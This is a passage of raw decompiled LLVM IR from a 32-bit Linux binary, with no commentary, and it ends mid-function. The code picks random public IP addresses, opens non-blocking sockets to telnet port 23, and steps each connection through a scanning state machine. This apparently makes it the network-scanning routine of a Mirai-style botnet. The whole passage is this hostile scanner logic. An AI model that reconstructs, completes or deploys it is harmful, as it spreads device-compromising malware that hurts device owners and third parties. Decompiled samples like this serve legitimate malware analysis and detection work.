  %v15_80527d5 = ptrtoint i32* %stack_var_-600 to i32
  store i32 %v15_80527d5, i32* %eax.global-to-local, align 4
  store i32 %v15_80527d5, i32* %stack_var_-684, align 4
  %v3_80527db = bitcast i32* %stack_var_-600 to i8*
  %v4_80527db = call i32 @__GI_memset(i8* %v3_80527db, i32 0, i32 8)
  store i32 %v4_80527db, i32* %eax.global-to-local, align 4
  store i32 1025, i32* %stack_var_-684, align 4
  %v1_80527e7 = call i32 @malloc(i32 1025)
  store i32 %v1_80527e7, i32* %eax.global-to-local, align 4
  store i32 %v1_80527e7, i32* %stack_var_-684, align 4
  %v3_8052805 = inttoptr i32 %v1_80527e7 to i8*
  %v4_8052805 = call i32 @__GI_memset(i8* %v3_8052805, i32 0, i32 1025)
  %v2_805280d = mul i32 %stack_var_-56.0, 32
  %v1_8052810 = or i32 %v2_805280d, 15
  %v1_8052813 = add i32 %v1_8052810, 15
  %v2_8052816 = and i32 %v1_8052813, -16
  %v0_805281c = load i32, i32* @esp, align 4
  %v2_805281c = sub i32 %v0_805281c, %v2_8052816
  %v1_805282e = add i32 %v2_805281c, 43
  %v2_8052831 = and i32 %v1_805282e, -16
  %v2_805284e = mul i32 %stack_var_-56.0, 5
  store i32 %v2_805284e, i32* %eax.global-to-local, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  %v2_8052853 = add i32 %v2_805281c, 8
  %v3_8052853 = inttoptr i32 %v2_8052853 to i32*
  store i32 %v2_805284e, i32* %v3_8052853, align 4
  %v0_8052857 = load i32, i32* @esp, align 4
  %v1_8052857 = add i32 %v0_8052857, 4
  %v2_8052857 = inttoptr i32 %v1_8052857 to i32*
  store i32 0, i32* %v2_8052857, align 4
  %v0_805285f = load i32, i32* %edx.global-to-local, align 4
  %v1_805285f = load i32, i32* @esp, align 4
  %v2_805285f = inttoptr i32 %v1_805285f to i32*
  store i32 %v0_805285f, i32* %v2_805285f, align 4
  %v3_8052862 = inttoptr i32 %v2_8052831 to i8*
  %v4_8052862 = call i32 @__GI_memset(i8* %v3_8052862, i32 %tmp27, i32 %v15_805272a)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_80528be100 = icmp sgt i32 %stack_var_-56.0, 0
  br i1 %v5_80528be100, label %dec_label_pc_8052870, label %dec_label_pc_80528c0.preheader

dec_label_pc_8052870:                             ; preds = %dec_label_pc_80527a0, %dec_label_pc_8052870
  %storemerge5101 = phi i32 [ %v4_80528b5, %dec_label_pc_8052870 ], [ 0, %dec_label_pc_80527a0 ]
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  %v2_8052876 = mul i32 %storemerge5101, 32
  %v2_8052879 = add i32 %v2_8052876, %v2_8052831
  store i32 %v2_8052879, i32* %eax.global-to-local, align 4
  %v0_805287c = load i32, i32* @esp, align 4
  %v1_805287c = add i32 %v0_805287c, 8
  %v2_805287c = inttoptr i32 %v1_805287c to i32*
  store i32 32, i32* %v2_805287c, align 4
  %v0_8052884 = load i32, i32* @esp, align 4
  %v1_8052884 = add i32 %v0_8052884, 4
  %v2_8052884 = inttoptr i32 %v1_8052884 to i32*
  store i32 0, i32* %v2_8052884, align 4
  %v0_805288c = load i32, i32* %eax.global-to-local, align 4
  %v1_805288c = load i32, i32* @esp, align 4
  %v2_805288c = inttoptr i32 %v1_805288c to i32*
  store i32 %v0_805288c, i32* %v2_805288c, align 4
  %v3_805288f = inttoptr i32 %storemerge5101 to i8*
  %v4_805288f = call i32 @__GI_memset(i8* %v3_805288f, i32 %tmp20, i32 %tmp8)
  %v2_805289d = or i32 %v2_8052876, 9
  %v3_805289d = add i32 %v2_805289d, %v2_8052831
  %v4_805289d = inttoptr i32 %v3_805289d to i8*
  store i8 1, i8* %v4_805289d, align 1
  %v1_80528ad = add i32 %v2_8052879, 28
  store i32 %v1_80528ad, i32* %edx.global-to-local, align 4
  %v2_80528b3 = inttoptr i32 %v1_80528ad to i32*
  store i32 %v1_80527e7, i32* %v2_80528b3, align 4
  %v4_80528b5 = add nuw nsw i32 %storemerge5101, 1
  store i32 %v4_80528b5, i32* %eax.global-to-local, align 4
  %v5_80528be = icmp slt i32 %v4_80528b5, %stack_var_-56.0
  br i1 %v5_80528be, label %dec_label_pc_8052870, label %dec_label_pc_80528c0.preheader

dec_label_pc_80528c0.preheader:                   ; preds = %dec_label_pc_8052870, %dec_label_pc_80527a0
  %v2_8052b7f = ptrtoint i32* %stack_var_-320 to i32
  %tmp52 = bitcast i32* %stack_var_-320 to i8*
  %v2_8052bd8 = ptrtoint i32* %stack_var_-328 to i32
  %v2_8052c31 = ptrtoint i32* %stack_var_-332 to i32
  %v2_8052c3b = ptrtoint i32* %stack_var_-336 to i32
  %v2_8053300 = ptrtoint i32* %stack_var_-192 to i32
  %v2_8053512 = ptrtoint i32* %stack_var_-256 to i32
  %v4_8053515 = bitcast i32* %stack_var_-192 to i8*
  %v5_805356f62 = icmp sgt i32 %tmp8, 0
  br label %dec_label_pc_80528c0

dec_label_pc_80528c0:                             ; preds = %dec_label_pc_80528c0, %dec_label_pc_805372c, %dec_label_pc_80528c0.preheader
  %stack_var_-628.0 = phi i32 [ %tmp18, %dec_label_pc_80528c0.preheader ], [ %stack_var_-628.0, %dec_label_pc_80528c0 ], [ %stack_var_-628.1, %dec_label_pc_805372c ]
  %stack_var_-640.0 = phi i32 [ %tmp11, %dec_label_pc_80528c0.preheader ], [ %stack_var_-640.0, %dec_label_pc_80528c0 ], [ %stack_var_-640.3, %dec_label_pc_805372c ]
  %stack_var_-644.0 = phi i32 [ %tmp10, %dec_label_pc_80528c0.preheader ], [ %stack_var_-644.0, %dec_label_pc_80528c0 ], [ %stack_var_-644.3, %dec_label_pc_805372c ]
  %stack_var_-648.0 = phi i32 [ %tmp9, %dec_label_pc_80528c0.preheader ], [ %stack_var_-648.0, %dec_label_pc_80528c0 ], [ %stack_var_-648.2, %dec_label_pc_805372c ]
  %stack_var_-624.0 = phi i32 [ %tmp19, %dec_label_pc_80528c0.preheader ], [ %stack_var_-624.0, %dec_label_pc_80528c0 ], [ %stack_var_-624.1, %dec_label_pc_805372c ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_80528be100, label %dec_label_pc_80528cc, label %dec_label_pc_80528c0

dec_label_pc_80528cc:                             ; preds = %dec_label_pc_80528c0, %dec_label_pc_805372c
  %storemerge85 = phi i32 [ %v4_805372c, %dec_label_pc_805372c ], [ 0, %dec_label_pc_80528c0 ]
  %stack_var_-624.284 = phi i32 [ %stack_var_-624.1, %dec_label_pc_805372c ], [ %stack_var_-624.0, %dec_label_pc_80528c0 ]
  %stack_var_-648.383 = phi i32 [ %stack_var_-648.2, %dec_label_pc_805372c ], [ %stack_var_-648.0, %dec_label_pc_80528c0 ]
  %stack_var_-644.482 = phi i32 [ %stack_var_-644.3, %dec_label_pc_805372c ], [ %stack_var_-644.0, %dec_label_pc_80528c0 ]
  %stack_var_-640.481 = phi i32 [ %stack_var_-640.3, %dec_label_pc_805372c ], [ %stack_var_-640.0, %dec_label_pc_80528c0 ]
  %stack_var_-628.278 = phi i32 [ %stack_var_-628.1, %dec_label_pc_805372c ], [ %stack_var_-628.0, %dec_label_pc_80528c0 ]
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  %v2_80528d2 = mul i32 %storemerge85, 32
  %v2_80528d5 = add i32 %v2_80528d2, %v2_8052831
  %v1_80528d7 = add i32 %v2_80528d5, 16
  store i32 %v1_80528d7, i32* %eax.global-to-local, align 4
  %v1_80528da = inttoptr i32 %v1_80528d7 to i32*
  %v2_80528da = load i32, i32* %v1_80528da, align 16
  store i32 %v2_80528da, i32* %eax.global-to-local, align 4
  %v1_80528dc = icmp eq i32 %v2_80528da, 0
  %v1_80528de = icmp eq i1 %v1_80528dc, false
  br i1 %v1_80528de, label %dec_label_pc_8052900, label %dec_label_pc_80528e0

dec_label_pc_80528e0:                             ; preds = %dec_label_pc_80528cc
  store i32 %storemerge85, i32* @ebx, align 4
  %v0_80528e3 = load i32, i32* @esp, align 4
  %v1_80528e3 = inttoptr i32 %v0_80528e3 to i32*
  store i32 0, i32* %v1_80528e3, align 4
  %v1_80528ea = inttoptr i32 %storemerge85 to i32*
  %v2_80528ea = call i32 @__GI_time(i32* %v1_80528ea)
  store i32 %v2_80528ea, i32* @ecx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  %v0_80528f4 = load i32, i32* @ebx, align 4
  %v2_80528f6 = mul i32 %v0_80528f4, 32
  %v2_80528f9 = add i32 %v2_80528f6, %v2_8052831
  %v1_80528fb = add i32 %v2_80528f9, 16
  store i32 %v1_80528fb, i32* %eax.global-to-local, align 4
  %v2_80528fe = inttoptr i32 %v1_80528fb to i32*
  store i32 %v2_80528ea, i32* %v2_80528fe, align 16
  br label %dec_label_pc_8052900

dec_label_pc_8052900:                             ; preds = %dec_label_pc_80528cc, %dec_label_pc_80528e0
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v2_8052909 = or i32 %v2_80528d2, 8
  %v3_8052909 = add i32 %v2_8052909, %v2_8052831
  %v4_8052909 = inttoptr i32 %v3_8052909 to i8*
  %v5_8052909 = load i8, i8* %v4_8052909, align 8
  %v6_8052909 = zext i8 %v5_8052909 to i32
  store i32 %v6_8052909, i32* %eax.global-to-local, align 4
  store i32 %v6_8052909, i32* @edi, align 4
  %v1_805292a = mul nuw nsw i32 %v6_8052909, 4
  %v2_805292a = add nuw nsw i32 %v1_805292a, 134656628
  %v3_805292a = inttoptr i32 %v2_805292a to i32*
  %v4_805292a = load i32, i32* %v3_805292a, align 4
  store i32 %v4_805292a, i32* %eax.global-to-local, align 4
  switch i8 %v5_8052909, label %dec_label_pc_805372c [
    i8 0, label %dec_label_pc_8052933
    i8 1, label %dec_label_pc_8052b75
    i8 2, label %dec_label_pc_8052d4c
    i8 3, label %dec_label_pc_8052e2d
    i8 4, label %dec_label_pc_8052f25
    i8 5, label %dec_label_pc_8053006
    i8 6, label %dec_label_pc_80530fe
    i8 7, label %dec_label_pc_80532d0
    i8 8, label %dec_label_pc_8053596
  ]

dec_label_pc_8052933:                             ; preds = %dec_label_pc_8052900
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v2_805293c = or i32 %v2_80528d2, 9
  %v3_805293c = add i32 %v2_805293c, %v2_8052831
  %v4_805293c = inttoptr i32 %v3_805293c to i8*
  %v5_805293c = load i8, i8* %v4_805293c, align 1
  %v10_8052941 = icmp eq i8 %v5_805293c, 1
  %v1_8052943 = icmp eq i1 %v10_8052941, false
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  br i1 %v1_8052943, label %dec_label_pc_80529aa, label %dec_label_pc_8052945

dec_label_pc_8052945:                             ; preds = %dec_label_pc_8052933
  %v1_8052950 = add i32 %v2_80528d5, 28
  store i32 %v1_8052950, i32* %eax.global-to-local, align 4
  %v1_8052953 = inttoptr i32 %v1_8052950 to i32*
  %v2_8052953 = load i32, i32* %v1_8052953, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v0_8052964 = load i32, i32* @esp, align 4
  %v1_8052964 = add i32 %v0_8052964, 8
  %v2_8052964 = inttoptr i32 %v1_8052964 to i32*
  store i32 32, i32* %v2_8052964, align 4
  %v0_805296c = load i32, i32* @esp, align 4
  %v1_805296c = add i32 %v0_805296c, 4
  %v2_805296c = inttoptr i32 %v1_805296c to i32*
  store i32 0, i32* %v2_805296c, align 4
  %v0_8052974 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052974 = load i32, i32* @esp, align 4
  %v2_8052974 = inttoptr i32 %v1_8052974 to i32*
  store i32 %v0_8052974, i32* %v2_8052974, align 4
  %v2_8052977 = load i32, i32* %stack_var_-608, align 4
  %v3_8052977 = inttoptr i32 %v6_8052909 to i8*
  %v4_8052977 = call i32 @__GI_memset(i8* %v3_8052977, i32 %v15_805272a, i32 %v2_8052977)
  store i32 %v1_8052950, i32* %edx.global-to-local, align 4
  store i32 %v2_8052953, i32* %eax.global-to-local, align 4
  store i32 %v2_8052953, i32* %v1_8052953, align 4
  store i32 %storemerge85, i32* @ebx, align 4
  %v0_8052992 = call i32 @getRandomPublicIP()
  store i32 %v0_8052992, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  %v0_805299c = load i32, i32* @ebx, align 4
  %v2_805299e = mul i32 %v0_805299c, 32
  %v2_80529a1 = add i32 %v2_805299e, %v2_8052831
  %v1_80529a3 = or i32 %v2_80529a1, 4
  store i32 %v1_80529a3, i32* %eax.global-to-local, align 4
  %v2_80529a6 = inttoptr i32 %v1_80529a3 to i32*
  store i32 %v0_8052992, i32* %v2_80529a6, align 4
  br label %dec_label_pc_8052a21

dec_label_pc_80529aa:                             ; preds = %dec_label_pc_8052933
  %v5_80529b3 = load i8, i8* %v4_805293c, align 1
  %v6_80529b3 = zext i8 %v5_80529b3 to i32
  store i32 %v6_80529b3, i32* %eax.global-to-local, align 4
  %v4_80529b8 = icmp eq i8 %v5_80529b3, 0
  %v1_80529ba = icmp eq i1 %v4_80529b8, false
  br i1 %v1_80529ba, label %dec_label_pc_8052a21, label %dec_label_pc_80529bc

dec_label_pc_80529bc:                             ; preds = %dec_label_pc_80529aa
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v2_80529c5 = or i32 %v2_80528d2, 10
  %v3_80529c5 = add i32 %v2_80529c5, %v2_8052831
  %v4_80529c5 = inttoptr i32 %v3_80529c5 to i8*
  %v5_80529c5 = load i8, i8* %v4_80529c5, align 2
  %v6_80529c5 = zext i8 %v5_80529c5 to i32
  store i32 %v6_80529c5, i32* %eax.global-to-local, align 4
  %tmp = icmp ult i8 %v5_80529c5, 99
  br i1 %tmp, label %dec_label_pc_80529e1, label %dec_label_pc_80529ce

dec_label_pc_80529ce:                             ; preds = %dec_label_pc_80529bc
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_805293c, align 1
  br label %dec_label_pc_805372c

dec_label_pc_80529e1:                             ; preds = %dec_label_pc_80529bc
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v5_80529ec = load i8, i8* %v4_80529c5, align 2
  %v2_80529f1 = load i32, i32* @ecx, align 4
  %v2_80529f3 = add i8 %v5_80529ec, 1
  %v14_80529f3 = zext i8 %v2_80529f3 to i32
  %v16_80529f3 = and i32 %v2_80529f1, -256
  %v17_80529f3 = or i32 %v16_80529f3, %v14_80529f3
  store i32 %v17_80529f3, i32* %ecx.global-to-local, align 4
  store i8 %v2_80529f3, i8* %v4_80529c5, align 2
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v2_8052a0c = or i32 %v2_80528d2, 11
  %v3_8052a0c = add i32 %v2_8052a0c, %v2_8052831
  %v4_8052a0c = inttoptr i32 %v3_8052a0c to i8*
  %v5_8052a0c = load i8, i8* %v4_8052a0c, align 1
  %v2_8052a11 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052a13 = add i8 %v5_8052a0c, 1
  %v14_8052a13 = zext i8 %v2_8052a13 to i32
  %v16_8052a13 = and i32 %v2_8052a11, -256
  %v17_8052a13 = or i32 %v16_8052a13, %v14_8052a13
  store i32 %v17_8052a13, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  store i8 %v2_8052a13, i8* %v4_8052a0c, align 1
  br label %dec_label_pc_8052a21

dec_label_pc_8052a21:                             ; preds = %dec_label_pc_80529aa, %dec_label_pc_8052945, %dec_label_pc_80529e1
  store i32 2, i32* %stack_var_-608, align 4
  %v0_8052a2a = load i32, i32* @esp, align 4
  %v1_8052a2a = inttoptr i32 %v0_8052a2a to i32*
  store i32 23, i32* %v1_8052a2a, align 4
  %v0_8052a31 = load i32, i32* %stack_var_-608, align 4
  %v1_8052a31 = trunc i32 %v0_8052a31 to i16
  %v2_8052a31 = call i32 @htons(i16 %v1_8052a31)
  %v0_8052a40 = load i32, i32* @esp, align 4
  %v1_8052a40 = add i32 %v0_8052a40, 8
  %v2_8052a40 = inttoptr i32 %v1_8052a40 to i32*
  store i32 8, i32* %v2_8052a40, align 4
  %v0_8052a48 = load i32, i32* @esp, align 4
  %v1_8052a48 = add i32 %v0_8052a48, 4
  %v2_8052a48 = inttoptr i32 %v1_8052a48 to i32*
  store i32 0, i32* %v2_8052a48, align 4
  store i32 %v15_80527d5, i32* %eax.global-to-local, align 4
  %v1_8052a59 = load i32, i32* @esp, align 4
  %v2_8052a59 = inttoptr i32 %v1_8052a59 to i32*
  store i32 %v15_80527d5, i32* %v2_8052a59, align 4
  %sext = mul i32 %v2_8052a31, 65536
  %v1_8052a5c = sdiv i32 %sext, 65536
  %v4_8052a5c = inttoptr i32 %v1_8052a5c to i8*
  %v5_8052a5c = call i32 @__GI_memset(i8* %v4_8052a5c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  %v1_8052a6c = or i32 %v2_80528d5, 4
  store i32 %v1_8052a6c, i32* %eax.global-to-local, align 4
  %v1_8052a6f = inttoptr i32 %v1_8052a6c to i32*
  %v2_8052a6f = load i32, i32* %v1_8052a6f, align 4
  store i32 %v2_8052a6f, i32* %eax.global-to-local, align 4
  store i32 %storemerge85, i32* @ebx, align 4
  %v0_8052a7a = load i32, i32* @esp, align 4
  %v1_8052a7a = add i32 %v0_8052a7a, 8
  %v2_8052a7a = inttoptr i32 %v1_8052a7a to i32*
  store i32 0, i32* %v2_8052a7a, align 4
  %v0_8052a82 = load i32, i32* @esp, align 4
  %v1_8052a82 = add i32 %v0_8052a82, 4
  %v2_8052a82 = inttoptr i32 %v1_8052a82 to i32*
  store i32 1, i32* %v2_8052a82, align 4
  %v0_8052a8a = load i32, i32* @esp, align 4
  %v1_8052a8a = inttoptr i32 %v0_8052a8a to i32*
  store i32 2, i32* %v1_8052a8a, align 4
  %v1_8052a91 = load i32, i32* %stack_var_-600, align 4
  %v3_8052a91 = call i32 @socket(i32 %v2_8052a6f, i32 %v1_8052a91, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8052a91, i32* @ecx, align 4
  %v0_8052a9b = load i32, i32* @ebx, align 4
  %v2_8052a9d = mul i32 %v0_8052a9b, 32
  %v3_8052aa0 = add i32 %v2_8052a9d, %v2_8052831
  %v4_8052aa0 = inttoptr i32 %v3_8052aa0 to i32*
  store i32 %v3_8052a91, i32* %v4_8052aa0, align 16
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v3_8052aac = inttoptr i32 %v2_80528d5 to i32*
  %v4_8052aac = load i32, i32* %v3_8052aac, align 16
  store i32 %v4_8052aac, i32* %eax.global-to-local, align 4
  %v10_8052aaf = icmp eq i32 %v4_8052aac, -1
  br i1 %v10_8052aaf, label %dec_label_pc_805372c, label %dec_label_pc_8052ab8

dec_label_pc_8052ab8:                             ; preds = %dec_label_pc_8052a21
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v4_8052ac1 = load i32, i32* %v3_8052aac, align 16
  store i32 %v4_8052ac1, i32* %eax.global-to-local, align 4
  %v0_8052ac4 = load i32, i32* @esp, align 4
  %v1_8052ac4 = add i32 %v0_8052ac4, 8
  %v2_8052ac4 = inttoptr i32 %v1_8052ac4 to i32*
  store i32 0, i32* %v2_8052ac4, align 4
  %v0_8052acc = load i32, i32* @esp, align 4
  %v1_8052acc = add i32 %v0_8052acc, 4
  %v2_8052acc = inttoptr i32 %v1_8052acc to i32*
  store i32 3, i32* %v2_8052acc, align 4
  %v0_8052ad4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ad4 = load i32, i32* @esp, align 4
  %v2_8052ad4 = inttoptr i32 %v1_8052ad4 to i32*
  store i32 %v0_8052ad4, i32* %v2_8052ad4, align 4
  %v1_8052ad7 = load i32, i32* %stack_var_-600, align 4
  %v3_8052ad7 = call i32 @fcntl(i32 %v2_8052a6f, i32 %v1_8052ad7, i32 ptrtoint (i32* @0 to i32))
  %v1_8052ade = or i32 %v3_8052ad7, 2048
  store i32 %v1_8052ade, i32* @ecx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v4_8052aed = load i32, i32* %v3_8052aac, align 16
  store i32 %v4_8052aed, i32* %eax.global-to-local, align 4
  %v1_8052af0 = load i32, i32* @esp, align 4
  %v2_8052af0 = add i32 %v1_8052af0, 8
  %v3_8052af0 = inttoptr i32 %v2_8052af0 to i32*
  store i32 %v1_8052ade, i32* %v3_8052af0, align 4
  %v0_8052af4 = load i32, i32* @esp, align 4
  %v1_8052af4 = add i32 %v0_8052af4, 4
  %v2_8052af4 = inttoptr i32 %v1_8052af4 to i32*
  store i32 4, i32* %v2_8052af4, align 4
  %v0_8052afc = load i32, i32* %eax.global-to-local, align 4
  %v1_8052afc = load i32, i32* @esp, align 4
  %v2_8052afc = inttoptr i32 %v1_8052afc to i32*
  store i32 %v0_8052afc, i32* %v2_8052afc, align 4
  %v1_8052aff = load i32, i32* %stack_var_-600, align 4
  %v3_8052aff = call i32 @fcntl(i32 %v2_8052a6f, i32 %v1_8052aff, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_80527cf, i32* @ecx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v4_8052b13 = load i32, i32* %v3_8052aac, align 16
  store i32 %v4_8052b13, i32* %eax.global-to-local, align 4
  %v0_8052b16 = load i32, i32* @esp, align 4
  %v1_8052b16 = add i32 %v0_8052b16, 8
  %v2_8052b16 = inttoptr i32 %v1_8052b16 to i32*
  store i32 16, i32* %v2_8052b16, align 4
  %v1_8052b1e = load i32, i32* @esp, align 4
  %v2_8052b1e = add i32 %v1_8052b1e, 4
  %v3_8052b1e = inttoptr i32 %v2_8052b1e to i32*
  store i32 %v2_80527cf, i32* %v3_8052b1e, align 4
  %v0_8052b22 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b22 = load i32, i32* @esp, align 4
  %v2_8052b22 = inttoptr i32 %v1_8052b22 to i32*
  store i32 %v0_8052b22, i32* %v2_8052b22, align 4
  %v1_8052b25 = load i32, i32* %stack_var_-600, align 4
  %v3_8052b25 = call i32 @connect(i32 %v2_8052a6f, i32 %v1_8052b25, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8052b25, i32* %eax.global-to-local, align 4
  %v10_8052b2a = icmp eq i32 %v3_8052b25, -1
  %v1_8052b2d = icmp eq i1 %v10_8052b2a, false
  br i1 %v1_8052b2d, label %dec_label_pc_8052b54, label %dec_label_pc_8052b2f

dec_label_pc_8052b2f:                             ; preds = %dec_label_pc_8052ab8
  %v1_8052b2f = call i32 @__errno_location(i32 %v2_8052a6f)
  store i32 %v1_8052b2f, i32* %eax.global-to-local, align 4
  %v1_8052b34 = inttoptr i32 %v1_8052b2f to i32*
  %v2_8052b34 = load i32, i32* %v1_8052b34, align 4
  store i32 %v2_8052b34, i32* %eax.global-to-local, align 4
  %v9_8052b36 = icmp eq i32 %v2_8052b34, 115
  br i1 %v9_8052b36, label %dec_label_pc_8052b54, label %dec_label_pc_8052b3b

dec_label_pc_8052b3b:                             ; preds = %dec_label_pc_8052b2f
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_8052b47 = load i32, i32* @esp, align 4
  %v2_8052b47 = inttoptr i32 %v1_8052b47 to i32*
  store i32 %v2_80528d5, i32* %v2_8052b47, align 4
  %v1_8052b4a = call i32 @reset_ipstate(i32 %v2_8052a6f)
  store i32 %v1_8052b4a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052b54:                             ; preds = %dec_label_pc_8052b2f, %dec_label_pc_8052ab8
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v0_8052b60 = load i32, i32* @esp, align 4
  %v1_8052b60 = add i32 %v0_8052b60, 4
  %v2_8052b60 = inttoptr i32 %v1_8052b60 to i32*
  store i32 1, i32* %v2_8052b60, align 4
  %v0_8052b68 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b68 = load i32, i32* @esp, align 4
  %v2_8052b68 = inttoptr i32 %v1_8052b68 to i32*
  store i32 %v0_8052b68, i32* %v2_8052b68, align 4
  %v1_8052b6b = load i32, i32* %stack_var_-600, align 4
  %v2_8052b6b = inttoptr i32 %v2_8052a6f to i32*
  %v3_8052b6b = call i32 @advance_state(i32* %v2_8052b6b, i32 %v1_8052b6b)
  store i32 %v3_8052b6b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8052b75:                             ; preds = %dec_label_pc_8052900
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052b7f, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8052b86 = call i8* @_memset(i8* %tmp52, i32 0, i32 32)
  %v6_8052b86 = ptrtoint i8* %v5_8052b86 to i32
  store i32 %v6_8052b86, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v3_8052b97 = inttoptr i32 %v2_80528d5 to i32*
  %v4_8052b97 = load i32, i32* %v3_8052b97, align 16
  %v2_8052b9c = udiv i32 %v4_8052b97, 32
  store i32 %v2_8052b9c, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v4_8052ba8 = load i32, i32* %v3_8052b97, align 16
  %v1_8052bab = urem i32 %v4_8052ba8, 32
  store i32 %v1_8052bab, i32* %eax.global-to-local, align 4
  %v0_8052bae = load i32, i32* @ebp, align 4
  %v2_8052bae = mul nuw nsw i32 %v2_8052b9c, 4
  %v3_8052bae = add nsw i32 %v2_8052bae, -316
  %v4_8052bae = add i32 %v3_8052bae, %v0_8052bae
  %v5_8052bae = inttoptr i32 %v4_8052bae to i32*
  %v6_8052bae = load i32, i32* %v5_8052bae, align 4
  %v9_8052bae = shl i32 1, %v1_8052bab
  %v12_8052bae = or i32 %v6_8052bae, %v9_8052bae
  store i32 %v12_8052bae, i32* %v5_8052bae, align 4
  store i32 0, i32* %stack_var_-328, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v4_8052bd2 = load i32, i32* %v3_8052b97, align 16
  %v1_8052bd5 = add i32 %v4_8052bd2, 1
  store i32 %v1_8052bd5, i32* %edx.global-to-local, align 4
  %v1_8052bde = load i32, i32* @esp, align 4
  %v2_8052bde = add i32 %v1_8052bde, 16
  %v3_8052bde = inttoptr i32 %v2_8052bde to i32*
  store i32 %v2_8052bd8, i32* %v3_8052bde, align 4
  %v0_8052be2 = load i32, i32* @esp, align 4
  %v1_8052be2 = add i32 %v0_8052be2, 12
  %v2_8052be2 = inttoptr i32 %v1_8052be2 to i32*
  store i32 0, i32* %v2_8052be2, align 4
  store i32 %v2_8052b7f, i32* %eax.global-to-local, align 4
  %v1_8052bf0 = load i32, i32* @esp, align 4
  %v2_8052bf0 = add i32 %v1_8052bf0, 8
  %v3_8052bf0 = inttoptr i32 %v2_8052bf0 to i32*
  store i32 %v2_8052b7f, i32* %v3_8052bf0, align 4
  %v0_8052bf4 = load i32, i32* @esp, align 4
  %v1_8052bf4 = add i32 %v0_8052bf4, 4
  %v2_8052bf4 = inttoptr i32 %v1_8052bf4 to i32*
  store i32 0, i32* %v2_8052bf4, align 4
  %v0_8052bfc = load i32, i32* %edx.global-to-local, align 4
  %v1_8052bfc = load i32, i32* @esp, align 4
  %v2_8052bfc = inttoptr i32 %v1_8052bfc to i32*
  store i32 %v0_8052bfc, i32* %v2_8052bfc, align 4
  %v0_8052bff = load i32, i32* %stack_var_-328, align 4
  %v2_8052bff = load i32, i32* %stack_var_-320, align 4
  %v5_8052bff = call i32 @__libc_select(i32 %v0_8052bff, i32 %arg1, i32 %v2_8052bff, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8052bff, i32* %eax.global-to-local, align 4
  %v12_8052c07 = icmp eq i32 %v5_8052bff, 1
  %v1_8052c0b = icmp eq i1 %v12_8052c07, false
  br i1 %v1_8052c0b, label %dec_label_pc_8052ced, label %dec_label_pc_8052c11

dec_label_pc_8052c11:                             ; preds = %dec_label_pc_8052b75
  store i32 4, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v4_8052c2e = load i32, i32* %v3_8052b97, align 16
  store i32 %v4_8052c2e, i32* %edx.global-to-local, align 4
  %v1_8052c37 = load i32, i32* @esp, align 4
